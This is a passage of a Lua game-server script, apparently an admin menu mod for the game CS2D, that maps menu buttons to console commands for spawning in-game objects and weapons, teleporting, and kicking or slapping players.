parse('spawnobject 15 '..player(id,"tilex")..' '..(player(id,"tiley")+1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Super Supply On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Spawn Object - Page 2/3,Supply,Turret,Dual Turret,Triple Turret,Super Supply,Teleporter Entrance,Teleporter Exit,Next,Back")
end
end
if title=="Teleporter Entrance On Your ..." then
if buton==1 then
parse('spawnobject 13 '..(player(id,"tilex")-1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Teleporter Entrance On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnobject 13 '..(player(id,"tilex")+1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Teleporter Entrance On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnobject 13 '..player(id,"tilex")..' '..(player(id,"tiley")-1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Teleporter Entrance On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
parse('spawnobject 13 '..player(id,"tilex")..' '..(player(id,"tiley")+1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Teleporter Entrance On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Spawn Object - Page 2/3,Supply,Turret,Dual Turret,Triple Turret,Super Supply,Teleporter Entrance,Teleporter Exit,Next,Back")
end
end
if title=="Teleporter Exit On Your ..." then
if buton==1 then
parse('spawnobject 14 '..(player(id,"tilex")-1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Teleporter Exit On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnobject 14 '..(player(id,"tilex")+1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Teleporter Exit On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnobject 14 '..player(id,"tilex")..' '..(player(id,"tiley")-1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Teleporter Exit On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
parse('spawnobject 14 '..player(id,"tilex")..' '..(player(id,"tiley")+1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Teleporter Exit On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Spawn Object - Page 2/3,Supply,Turret,Dual Turret,Triple Turret,Super Supply,Teleporter Entrance,Teleporter Exit,Next,Back")
end
end
if title=="Spawn Object - Page 3/3" then
if buton==1 then
menu(id,"Construction Site On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
menu(id,"Mine On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
menu(id,"Orange Portal On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
menu(id,"Blue Portal On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Spawn Object - Page 2/3,Supply,Turret,Dual Turret,Triple Turret,Super Supply,Teleporter Entrance,Teleporter Exit,Next,Back")
end
end
if title=="Construction Site On Your ..." then
if buton==1 then
parse('spawnobject 10 '..(player(id,"tilex")-1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Construction Site On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnobject 10 '..(player(id,"tilex")+1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Construction Site On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnobject 10 '..player(id,"tilex")..' '..(player(id,"tiley")-1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Construction Site On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
parse('spawnobject 10 '..player(id,"tilex")..' '..(player(id,"tiley")+1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Construction Site On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Spawn Object - Page 3/3,Construction Site,Mine,Orange Portal,Blue Portal,Back")
end
end
if title=="Mine On Your ..." then
if buton==1 then
parse('spawnobject 20 '..(player(id,"tilex")-1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Mine On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnobject 20 '..(player(id,"tilex")+1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Mine On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnobject 20 '..player(id,"tilex")..' '..(player(id,"tiley")-1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Mine On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
parse('spawnobject 20 '..player(id,"tilex")..' '..(player(id,"tiley")+1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Mine On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Spawn Object - Page 3/3,Construction Site,Mine,Orange Portal,Blue Portal,Back")
end
end
if title=="Orange Portal On Your ..." then
if buton==1 then
parse('spawnobject 22 '..(player(id,"tilex")-1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Orange Portal On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnobject 22 '..(player(id,"tilex")+1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Orange Portal On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnobject 22 '..player(id,"tilex")..' '..(player(id,"tiley")-1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Orange Portal On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
parse('spawnobject 22 '..player(id,"tilex")..' '..(player(id,"tiley")+1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Orange Portal On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Spawn Object - Page 3/3,Construction Site,Mine,Orange Portal,Blue Portal,Back")
end
end
if title=="Blue Portal On Your ..." then
if buton==1 then
parse('spawnobject 23 '..(player(id,"tilex")-1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Blue Portal On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnobject 23 '..(player(id,"tilex")+1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Blue Portal On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnobject 23 '..player(id,"tilex")..' '..(player(id,"tiley")-1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Blue Portal On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
parse('spawnobject 23 '..player(id,"tilex")..' '..(player(id,"tiley")+1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Blue Portal On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Spawn Object - Page 3/3,Construction Site,Mine,Orange Portal,Blue Portal,Back")
end
end
if title=="Spawn Item" then
if buton==1 then
menu(id,"Pistols,Glock,USP,Deagle,P228,Elite,Five-Seven,Back")
elseif buton==2 then
menu(id,"Shotguns,M3,XM1014,Back")
elseif buton==3 then
menu(id,"SMGs,Mac10,TMP,UMP45,MP5,P90,Back")
elseif buton==4 then
menu(id,"Rifles - Page 1/2,Ak-47,M4A1,Famas,Galil,SG552,Steyr Aug,Scout,Next,Back")
elseif buton==5 then
parse('spawnitem 40 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Spawn Item,Pistols,Shotguns,SMGs,Rifles,Machine Gun,Armors,Grenades,Others,Back")
elseif buton==6 then
menu(id,"Armors,Kevlar,Kevlar+Helmet,Light Armor,Medium Armor,Heavy Armor,Medic Armor,Shealth Suit,Super Armor,Back")
elseif buton==7 then
menu(id,"Grenades,HE Grenade,Flashbang,Smoke Grenade,Flare,Molotov Cocktail,Gas Grenade,Airstrike,Gut Bomb,Back")
elseif buton==8 then
menu(id,"Others - Page 1/3,Laser,RPG Launcher,Flamethrower,Grenade Launcher,Rocket Launcher,Portal Gun,Mine,Next,Back")
end
end
if title=="Pistols" then
if buton==1 then
parse('spawnitem 2 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Pistols,Glock,USP,Deagle,P228,Elite,Five-Seven,Back")
elseif buton==2 then
parse('spawnitem 1 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Pistols,Glock,USP,Deagle,P228,Elite,Five-Seven,Back")
elseif buton==3 then
parse('spawnitem 3 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Pistols,Glock,USP,Deagle,P228,Elite,Five-Seven,Back")
elseif buton==4 then
parse('spawnitem 4 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Pistols,Glock,USP,Deagle,P228,Elite,Five-Seven,Back")
elseif buton==5 then
parse('spawnitem 5 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Pistols,Glock,USP,Deagle,P228,Elite,Five-Seven,Back")
elseif buton==6 then
parse('spawnitem 6 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Pistols,Glock,USP,Deagle,P228,Elite,Five-Seven,Back")
elseif buton==7 then
menu(id,"Spawn Item,Pistols,Shotguns,SMGs,Rifles,Machine Gun,Armors,Grenades,Others,Back")
end
end
if title=="Shotguns" then
if buton==1 then
parse('spawnitem 10 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Shotguns,M3,XM1014,Back")
elseif buton==2 then
parse('spawnitem 11 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Shotguns,M3,XM1014,Back")
elseif buton==3 then
menu(id,"Spawn Item,Pistols,Shotguns,SMGs,Rifles,Machine Gun,Armors,Grenades,Others,Back")
end
end
if title=="SMGs" then
if buton==1 then
parse('spawnitem 23 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"SMGs,Mac10,TMP,UMP45,MP5,P90,Back")
elseif buton==2 then
parse('spawnitem 21 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"SMGs,Mac10,TMP,UMP45,MP5,P90,Back")
elseif buton==3 then
parse('spawnitem 24 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"SMGs,Mac10,TMP,UMP45,MP5,P90,Back")
elseif buton==4 then
parse('spawnitem 20 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"SMGs,Mac10,TMP,UMP45,MP5,P90,Back")
elseif buton==5 then
parse('spawnitem 22 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"SMGs,Mac10,TMP,UMP45,MP5,P90,Back")
elseif buton==6 then
menu(id,"Spawn Item,Pistols,Shotguns,SMGs,Rifles,Machine Gun,Armors,Grenades,Others,Back")
end
end
if title=="Rifles - Page 1/2" then
if buton==1 then
parse('spawnitem 30 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Rifles - Page 1/2,Ak-47,M4A1,Famas,Galil,SG552,Steyr Aug,Scout,Next,Back")
elseif buton==2 then
parse('spawnitem 32 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Rifles - Page 1/2,Ak-47,M4A1,Famas,Galil,SG552,Steyr Aug,Scout,Next,Back")
elseif buton==3 then
parse('spawnitem 39 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Rifles - Page 1/2,Ak-47,M4A1,Famas,Galil,SG552,Steyr Aug,Scout,Next,Back")
elseif buton==4 then
parse('spawnitem 38 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Rifles - Page 1/2,Ak-47,M4A1,Famas,Galil,SG552,Steyr Aug,Scout,Next,Back")
elseif buton==5 then
parse('spawnitem 31 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Rifles - Page 1/2,Ak-47,M4A1,Famas,Galil,SG552,Steyr Aug,Scout,Next,Back")
elseif buton==6 then
parse('spawnitem 33 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Rifles - Page 1/2,Ak-47,M4A1,Famas,Galil,SG552,Steyr Aug,Scout,Next,Back")
elseif buton==7 then
parse('spawnitem 34 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Rifles - Page 1/2,Ak-47,M4A1,Famas,Galil,SG552,Steyr Aug,Scout,Next,Back")
elseif buton==8 then
menu(id,"Rifles - Page 2/2,AWP,SG550,G3SG1,Back")
elseif buton==9 then
menu(id,"Spawn Item,Pistols,Shotguns,SMGs,Rifles,Machine Gun,Armors,Grenades,Others,Back")
end
end
if title=="Rifles - Page 2/2" then
if buton==1 then
parse('spawnitem 35 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Rifles - Page 2/2,AWP,SG550,G3SG1,Back")
elseif buton==2 then
parse('spawnitem 37 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Rifles - Page 2/2,AWP,SG550,G3SG1,Back")
elseif buton==3 then
parse('spawnitem 36 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Rifles - Page 2/2,AWP,SG550,G3SG1,Back")
elseif buton==4 then
menu(id,"Rifles - Page 1/2,Ak-47,M4A1,Famas,Galil,SG552,Steyr Aug,Scout,Next,Back")
end
end
if title=="Armors" then
if buton==1 then
parse('spawnitem 57 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Armors,Kevlar,Kevlar+Helmet,Light Armor,Medium Armor,Heavy Armor,Medic Armor,Shealth Suit,Super Armor,Back")
elseif buton==2 then
parse('spawnitem 58 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Armors,Kevlar,Kevlar+Helmet,Light Armor,Medium Armor,Heavy Armor,Medic Armor,Shealth Suit,Super Armor,Back")
elseif buton==3 then
parse('spawnitem 79 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Armors,Kevlar,Kevlar+Helmet,Light Armor,Medium Armor,Heavy Armor,Medic Armor,Shealth Suit,Super Armor,Back")
elseif buton==4 then
parse('spawnitem 80 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Armors,Kevlar,Kevlar+Helmet,Light Armor,Medium Armor,Heavy Armor,Medic Armor,Shealth Suit,Super Armor,Back")
elseif buton==5 then
parse('spawnitem 81 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Armors,Kevlar,Kevlar+Helmet,Light Armor,Medium Armor,Heavy Armor,Medic Armor,Shealth Suit,Super Armor,Back")
elseif buton==6 then
parse('spawnitem 82 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Armors,Kevlar,Kevlar+Helmet,Light Armor,Medium Armor,Heavy Armor,Medic Armor,Shealth Suit,Super Armor,Back")
elseif buton==7 then
parse('spawnitem 84 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Armors,Kevlar,Kevlar+Helmet,Light Armor,Medium Armor,Heavy Armor,Medic Armor,Shealth Suit,Super Armor,Back")
elseif buton==8 then
parse('spawnitem 83 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Armors,Kevlar,Kevlar+Helmet,Light Armor,Medium Armor,Heavy Armor,Medic Armor,Shealth Suit,Super Armor,Back")
elseif buton==9 then
menu(id,"Spawn Item,Pistols,Shotguns,SMGs,Rifles,Machine Gun,Armors,Grenades,Others,Back")
end
end
if title=="Grenades" then
if buton==1 then
parse('spawnitem 51 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Grenades,HE Grenade,Flashbang,Smoke Grenade,Flare,Molotov Cocktail,Gas Grenade,Airstrike,Gut Bomb,Back")
elseif buton==2 then
parse('spawnitem 52 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Grenades,HE Grenade,Flashbang,Smoke Grenade,Flare,Molotov Cocktail,Gas Grenade,Airstrike,Gut Bomb,Back")
elseif buton==3 then
parse('spawnitem 53 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Grenades,HE Grenade,Flashbang,Smoke Grenade,Flare,Molotov Cocktail,Gas Grenade,Airstrike,Gut Bomb,Back")
elseif buton==4 then
parse('spawnitem 54 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Grenades,HE Grenade,Flashbang,Smoke Grenade,Flare,Molotov Cocktail,Gas Grenade,Airstrike,Gut Bomb,Back")
elseif buton==5 then
parse('spawnitem 73 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Grenades,HE Grenade,Flashbang,Smoke Grenade,Flare,Molotov Cocktail,Gas Grenade,Airstrike,Gut Bomb,Back")
elseif buton==6 then
parse('spawnitem 72 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Grenades,HE Grenade,Flashbang,Smoke Grenade,Flare,Molotov Cocktail,Gas Grenade,Airstrike,Gut Bomb,Back")
elseif buton==7 then
parse('spawnitem 76 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Grenades,HE Grenade,Flashbang,Smoke Grenade,Flare,Molotov Cocktail,Gas Grenade,Airstrike,Gut Bomb,Back")
elseif buton==8 then
parse('spawnitem 86 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Grenades,HE Grenade,Flashbang,Smoke Grenade,Flare,Molotov Cocktail,Gas Grenade,Airstrike,Gut Bomb,Back")
elseif buton==9 then
menu(id,"Spawn Item,Pistols,Shotguns,SMGs,Rifles,Machine Gun,Armors,Grenades,Others,Back")
end
end
if title=="Others - Page 1/3" then
if buton==1 then
parse('spawnitem 45 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 1/3,Laser,RPG Launcher,Flamethrower,Grenade Launcher,Rocket Launcher,Portal Gun,Mine,Next,Back")
elseif buton==2 then
parse('spawnitem 47 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 1/3,Laser,RPG Launcher,Flamethrower,Grenade Launcher,Rocket Launcher,Portal Gun,Mine,Next,Back")
elseif buton==3 then
parse('spawnitem 46 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 1/3,Laser,RPG Launcher,Flamethrower,Grenade Launcher,Rocket Launcher,Portal Gun,Mine,Next,Back")
elseif buton==4 then
parse('spawnitem 49 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 1/3,Laser,RPG Launcher,Flamethrower,Grenade Launcher,Rocket Launcher,Portal Gun,Mine,Next,Back")
elseif buton==5 then
parse('spawnitem 48 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 1/3,Laser,RPG Launcher,Flamethrower,Grenade Launcher,Rocket Launcher,Portal Gun,Mine,Next,Back")
elseif buton==6 then
parse('spawnitem 88 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 1/3,Laser,RPG Launcher,Flamethrower,Grenade Launcher,Rocket Launcher,Portal Gun,Mine,Next,Back")
elseif buton==7 then
parse('spawnitem 77 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 1/3,Laser,RPG Launcher,Flamethrower,Grenade Launcher,Rocket Launcher,Portal Gun,Mine,Next,Back")
elseif buton==8 then
menu(id,"Others - Page 2/3,Laser Mine,Tactical Shield,Snowball,Wrench,Chainsaw,Knife,Machete,Next,Back")
elseif buton==9 then
menu(id,"Spawn Item,Pistols,Shotguns,SMGs,Rifles,Machine Gun,Armors,Grenades,Others,Back")
end
end
if title=="Others - Page 2/3" then
if buton==1 then
parse('spawnitem 87 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 2/3,Laser Mine,Tactical Shield,Snowball,Wrench,Chainsaw,Knife,Machete,Next,Back")
elseif buton==2 then
parse('spawnitem 41 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 2/3,Laser Mine,Tactical Shield,Snowball,Wrench,Chainsaw,Knife,Machete,Next,Back")
elseif buton==3 then
parse('spawnitem 75 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 2/3,Laser Mine,Tactical Shield,Snowball,Wrench,Chainsaw,Knife,Machete,Next,Back")
elseif buton==4 then
parse('spawnitem 74 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 2/3,Laser Mine,Tactical Shield,Snowball,Wrench,Chainsaw,Knife,Machete,Next,Back")
elseif buton==5 then
parse('spawnitem 85 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 2/3,Laser Mine,Tactical Shield,Snowball,Wrench,Chainsaw,Knife,Machete,Next,Back")
elseif buton==6 then
parse('spawnitem 50 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 2/3,Laser Mine,Tactical Shield,Snowball,Wrench,Chainsaw,Knife,Machete,Next,Back")
elseif buton==7 then
parse('spawnitem 69 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 2/3,Laser Mine,Tactical Shield,Snowball,Wrench,Chainsaw,Knife,Machete,Next,Back")
elseif buton==8 then
menu(id,"Others - Page 3/3,Claw,Bomb,Red Flag,Blue Flag,Defuse Kit,Night Vision,Medikit,Gold,Back")
elseif buton==9 then
menu(id,"Others - Page 1/3,Laser,RPG Launcher,Flamethrower,Grenade Launcher,Rocket Launcher,Portal Gun,Mine,Next,Back")
end
end
if title=="Others - Page 3/3" then
if buton==1 then
parse('spawnitem 78 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 3/3,Claw,Bomb,Red Flag,Blue Flag,Defuse Kit,Night Vision,Medikit,Gold,Back")
elseif buton==2 then
parse('spawnitem 55 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 3/3,Claw,Bomb,Red Flag,Blue Flag,Defuse Kit,Night Vision,Medikit,Gold,Back")
elseif buton==3 then
parse('spawnitem 70 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 3/3,Claw,Bomb,Red Flag,Blue Flag,Defuse Kit,Night Vision,Medikit,Gold,Back")
elseif buton==4 then
parse('spawnitem 71 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 3/3,Claw,Bomb,Red Flag,Blue Flag,Defuse Kit,Night Vision,Medikit,Gold,Back")
elseif buton==5 then
parse('spawnitem 56 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 3/3,Claw,Bomb,Red Flag,Blue Flag,Defuse Kit,Night Vision,Medikit,Gold,Back")
elseif buton==6 then
parse('spawnitem 59 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 3/3,Claw,Bomb,Red Flag,Blue Flag,Defuse Kit,Night Vision,Medikit,Gold,Back")
elseif buton==7 then
parse('spawnitem 64 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 3/3,Claw,Bomb,Red Flag,Blue Flag,Defuse Kit,Night Vision,Medikit,Gold,Back")
elseif buton==8 then
parse('spawnitem 68 '..player(id,"tilex")..' '..player(id,"tiley"))
menu(id,"Others - Page 3/3,Claw,Bomb,Red Flag,Blue Flag,Defuse Kit,Night Vision,Medikit,Gold,Back")	
elseif buton==9 then
menu(id,"Others - Page 2/3,Laser Mine,Tactical Shield,Snowball,Wrench,Chainsaw,Knife,Machete,Next,Back")
end
end
if title=="Teleport Menu" then
if buton==1 then
parse('setpos '..id..' '..player(id,"x")..' '..(player(id,"y")-32))
menu(id,"Teleport Menu,Up,Down,Right,Left,Back")
elseif buton==2 then
parse('setpos '..id..' '..player(id,"x")..' '..(player(id,"y")+32))
menu(id,"Teleport Menu,Up,Down,Right,Left,Back")
elseif buton==3 then
parse('setpos '..id..' '..(player(id,"x")+32)..' '..player(id,"y"))
menu(id,"Teleport Menu,Up,Down,Right,Left,Back")
elseif buton==4 then
parse('setpos '..id..' '..(player(id,"x")-32)..' '..player(id,"y"))
menu(id,"Teleport Menu,Up,Down,Right,Left,Back")
elseif buton==5 then
menu(id,"Admin Menu,Server Settings,Create NPC,Create Building,Create Explosion,Create Color Smoke,Spawn Item,Teleport")
end
end
if title=="Punish a Player" then
if buton==1 then
menu(id,"Choose Your Ban Type,Ban USGN,Ban IP,Ban Name")
elseif buton==2 then
thenames(i)
menu(id,"Kick a Player - Names 1/2,"..name[1]..","..name[2]..","..name[3]..","..name[4]..","..name[5]..","..name[6]..","..name[7]..","..name[8]..",Next")
elseif buton==3 then
thenames(i)
menu(id,"Slap a Player - Names 1/2,"..name[1]..","..name[2]..","..name[3]..","..name[4]..","..name[5]..","..name[6]..","..name[7]..","..name[8]..",Next")
elseif buton==4 then
thenames(i)
menu(id,"Kill a Player - Names 1/2,"..name[1]..","..name[2]..","..name[3]..","..name[4]..","..name[5]..","..name[6]..","..name[7]..","..name[8]..",Next")
elseif buton==5 then
thenames(i)
menu(id,"Freeze a Player - Names 1/2,"..name[1]..","..name[2]..","..name[3]..","..name[4]..","..name[5]..","..name[6]..","..name[7]..","..name[8]..",Next")
elseif buton==6 then
thenames(i)
menu(id,"Bring 1 HP a Player - Names 1/2,"..name[1]..","..name[2]..","..name[3]..","..name[4]..","..name[5]..","..name[6]..","..name[7]..","..name[8]..",Next")
elseif buton==7 then
menu(id,"Admin Menu,Server Settings,Spawn Creature,Spawn Object,Spawn Item,Spawn Effect,Punish,More -->")
end
end
if title=="Choose Your Ban Type" then
if buton==1 then
thenames(i)
menu(id,"Ban USGN a Player - Names 1/2,"..name[1]..","..name[2]..","..name[3]..","..name[4]..","..name[5]..","..name[6]..","..name[7]..","..name[8]..",Next")
elseif buton==2 then
thenames(i)
menu(id,"Ban IP a Player - Names 1/2,"..name[1]..","..name[2]..","..name[3]..","..name[4]..","..name[5]..","..name[6]..","..name[7]..","..name[8]..",Next")
elseif buton==3 then
thenames(i)
menu(id,"Ban NAME a Player - Names 1/2,"..name[1]..","..name[2]..","..name[3]..","..name[4]..","..name[5]..","..name[6]..","..name[7]..","..name[8]..",Next")
end
end
if title=="Kick a Player - Names 1/2" then
if buton==1 then
thenames(i)
parse('kick 1')
	msg(""..player(id,"name").." [Admin] Kicked "..name[1])
elseif buton==2 then
parse('kick 2')
	msg(""..player(id,"name").." [Admin] Kicked "..name[2])
elseif buton==3 then
parse('kick 3')
	msg(""..player(id,"name").." [Admin] Kicked "..name[3])
elseif buton==4 then
parse('kick 4')
	msg(""..player(id,"name").." [Admin] Kicked "..name[4])
elseif buton==5 then
parse('kick 5')
	msg(""..player(id,"name").." [Admin] Kicked "..name[5])
elseif buton==6 then
parse('kick 6')
	msg(""..player(id,"name").." [Admin] Kicked "..name[6])
elseif buton==7 then
parse('kick 7')
	msg(""..player(id,"name").." [Admin] Kicked "..name[7])
elseif buton==8 then
parse('kick 8')
	msg(""..player(id,"name").." [Admin] Kicked "..name[8])
elseif buton==9 then
menu(id,"Kick a Player - Names 2/2,"..name[9]..","..name[10]..","..name[11]..","..name[12]..","..name[13]..","..name[14]..","..name[15]..","..name[16]..",Back")
end
end
if title=="Kick a Player - Names 2/2" then
if buton==1 then
thenames(i)
parse('kick 9')
	msg(""..player(id,"name").." [Admin] Kicked "..name[9])
elseif buton==2 then
parse('kick 10')
	msg(""..player(id,"name").." [Admin] Kicked "..name[10])
elseif buton==3 then
parse('kick 11')
	msg(""..player(id,"name").." [Admin] Kicked "..name[11])
elseif buton==4 then
parse('kick 12')
	msg(""..player(id,"name").." [Admin] Kicked "..name[12])
elseif buton==5 then
parse('kick 13')
	msg(""..player(id,"name").." [Admin] Kicked "..name[13])
elseif buton==6 then
parse('kick 14')
	msg(""..player(id,"name").." [Admin] Kicked "..name[14])
elseif buton==7 then
parse('kick 15')
	msg(""..player(id,"name").." [Admin] Kicked "..name[15])
elseif buton==8 then
parse('kick 16')
	msg(""..player(id,"name").." [Admin] Kicked "..name[16])
elseif buton==9 then
menu(id,"Kick a Player - Names 1/2,"..name[1]..","..name[2]..","..name[3]..","..name[4]..","..name[5]..","..name[6]..","..name[7]..","..name[8]..",Next")
end
end
if title=="Slap a Player - Names 1/2" then
if buton==1 then
thenames(i)
parse('slap 1')
	msg(""..player(id,"name").." [Admin] Slapped "..name[1])
elseif buton==2 then
parse('slap 2')
	msg(""..player(id,"name").." [Admin] Slapped "..name[2])
elseif buton==3 then
parse('slap 3')
	msg(""..player(id,"name").." [Admin] Slapped "..name[3])
elseif buton==4 then
parse('slap 4')
	msg(""..player(id,"name").." [Admin] Slapped "..name[4])
elseif buton==5 then
parse('slap 5')
	msg(""..player(id,"name").." [Admin] Slapped "..name[5])
elseif buton==6 then
parse('slap 6')
	msg(""..player(id,"name").." [Admin] Slapped "..name[6])
elseif buton==7 then
parse('slap 7')
	msg(""..player(id,"name").." [Admin] Slapped "..name[7])
elseif buton==8 then
parse('slap 8')
	msg(""..player(id,"name").." [Admin] Slapped "..name[8])
elseif buton==9 then
menu(id,"Slap a Player - Names 2/2,"..name[9]..","..name[10]..","..name[11]..","..name[12]..","..name[13]..","..name[14]..","..name[15]..","..name[16]..",Back")
end
end
if title=="Slap a Player - Names 2/2" then
if buton==1 then
thenames(i)
parse('slap 9')
	msg(""..player(id,"name").." [Admin] Slapped "..name[9])
elseif buton==2 then
parse('slap 10')
	msg(""..player(id,"name").." [Admin] Slapped "..name[10])
elseif buton==3 then
parse('slap 11')
	msg(""..player(id,"name").." [Admin] Slapped "..name[11])
elseif buton==4 then
parse('slap 12')
	msg(""..player(id,"name").." [Admin] Slapped "..name[12])
elseif buton==5 then
parse('slap 13')
	msg(""..player(id,"name").." [Admin] Slapped "..name[13])
elseif buton==6 then
parse('slap 14')
	msg(""..player(id,"name").." [Admin] Slapped "..name[14])
elseif buton==7 then
parse('slap 15')
	msg(""..player(id,"name").." [Admin] Slapped "..name[15])
elseif buton==8 then
parse('slap 16')
	msg(""..player(id,"name").." [Admin] Slapped "..name[16])
elseif buton==9 then
